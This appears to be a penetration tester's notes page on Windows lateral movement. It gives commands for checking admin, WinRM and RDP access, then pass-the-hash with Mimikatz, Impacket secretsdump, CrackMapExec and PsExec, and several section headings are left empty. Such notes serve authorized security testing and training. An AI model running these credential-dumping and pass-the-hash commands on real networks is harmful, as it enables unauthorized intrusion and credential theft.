# Lateral Movement

The adversary is trying to move through your environment.

Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network.

Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.

**Assumptions**

- We already obtained access to the internal environment.
- We are in possess of credential material for one or more users.
- We (optionally) obtained elevated access to one or more machines by unspecified means.

The techniques answer the question - **What type of access can I achieve with the current compromised user?**

When talking about local group membership, we will be mostly interested in being part of the following groups:

- Administrators
- Remote Desktop Users
- Remote Management Users
- Distributed COM Users

#### To check if user is part of Administrators group

The easiest way of determine whether we have local admin access (and therefore we’re part of the local Administrators group) to a remote machine is to attempt to list the content of the C: drive using the following command:

For a single machine

`dir \\<ip or hostname>\C$`

`powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername <ip or hostname>`

For multiple machines

PowerView’s cmdlet Find-LocalAdminAccess that will simply output the machines where the current user have admin privileges.

#### To check if user is part of Remote Management Users

`Invoke-Command -Computername <ip or hostname> -ScriptBlock {whoami}`

#### To check if user is part of Remote Desktop Users

Attempt to RDP. Simple!

#### Check user's local groups

`whoami /groups`

### Access to File Shares

### Access Control Lists

### MSSQL Access

### WMI

### Remote Service Creation

### Remote Desktop Protocol

### PowerShell Remoting

### Password Spray

### RDP Session Hijack

### Pass The Hash

#### Mimilatz

The command should spawn a new cmd.exe process with the credentials of the user we’re trying to impersonate.

`privilege::debug`

`sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH /run:cmd.exe`

Pass the has without starting a session

`sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH`

Verify. check if you can run commands on DC

`PsExec.exe \\<IP of DC> cmd.exe`

#### Impacket

`secretsdump.py -hashes LM:NTLM ./Administrator@<ip>`

Examples

```
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

#### CrackMapExec 

`crackmapexec smb <ip> -u <username> -H <hash> -x <command>`

Examples

`crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig`

reference the cheatsheet

### Pass-the-Ticket

**Windows Lateral Movement** 

- Lateral Movement Article https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
- Pass the hash article https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
- Pass the hash with Mimikatz https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/

